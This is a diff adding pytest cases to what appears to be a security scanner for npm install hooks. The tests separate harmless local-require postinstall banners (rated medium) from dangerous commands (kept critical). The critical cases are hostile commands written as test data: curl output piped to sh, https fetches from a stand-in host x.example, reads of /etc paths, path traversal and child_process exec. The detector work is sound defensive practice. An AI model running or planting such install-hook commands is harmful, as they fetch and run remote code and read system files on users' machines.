@@ -440,6 +440,48 @@ class TestInstallHookInlineNode:
         f = self._hook(cmd)
         assert f and f[0].severity == "critical", cmd
 
+    # core-js 3.50.0 ships exactly this: a funding banner loaded from a local file.
+    CORE_JS = "node -e \"try{require('./postinstall')}catch(e){}\""
+
+    @pytest.mark.parametrize("cmd", [
+        CORE_JS,
+        "node -e \"require('./scripts/postinstall')\"",
+        "node -e \"require('./postinstall.js');\"",
+        "node -e 'require(\"./postinstall\")'",
+        "node -e \"try { require('./lib/banner') } catch (err) { }\"",
+        "node -e \"try{require('./x')}catch(e){console.log('ok')}\"",
+        "node -e \"require('./scripts/../postinstall')\"",
+        "node ./postinstall.js",
+        "node postinstall.js || exit 0",
+    ])
+    def test_local_require_hooks_are_medium(self, cmd):
+        f = self._hook(cmd)
+        assert [x.severity for x in f] == ["medium"], cmd
+        assert "auto-runs on install" in f[0].name
+
+    @pytest.mark.parametrize("cmd", [
+        "node -e \"require('child_process').exec('curl x|sh')\"",
+        "node -e \"try{require('https').get('https://x.example/p')}catch(e){}\"",
+        "node -e \"try{require('https').get(u)}catch(e){}\"",
+        "node -e \"require('/etc/x')\"",
+        "node -e \"require('../../../x')\"",
+        "node -e \"require('../x')\"",
+        "node -e \"require('./a/../../x')\"",
+        "node -e \"require('./a'+process.env.X)\"",
+        "node -e \"require(`./${process.env.X}`)\"",
+        "node -e \"eval('1')\"",
+        "node -e \"require('./x'); require('child_process').exec('id')\"",
+        "node -e \"require('./x').run()\"",
+        "node -e \"try{require('./x')}catch(e){require('child_process').exec('id')}\"",
+        "node -e \"require('./x')\" && curl -s https://x.example/i.sh | sh",
+        "node -e \"Function('return 1')(); require('./x')\"",
+        "node -e \"require('file:///etc/x')\"",
+        "node -e \"require('https://x.example/p.js')\"",
+    ])
+    def test_non_local_or_compound_snippets_stay_critical(self, cmd):
+        f = self._hook(cmd)
+        assert f and f[0].severity == "critical", cmd
+
 
 # ── untrusted input must REACH the call for the critical lift ─────────────────
 
